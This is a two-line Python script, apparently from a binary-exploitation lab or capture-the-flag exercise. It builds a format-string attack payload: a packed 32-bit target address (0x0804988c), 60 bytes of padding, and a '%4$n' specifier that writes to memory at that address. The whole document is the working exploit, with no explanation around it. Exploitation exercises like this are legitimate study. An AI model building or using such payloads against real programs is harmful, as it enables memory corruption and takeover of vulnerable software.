import struct; 

print(struct.pack("<I", 0x0804988c) + b"A"*60 + b"%4$n")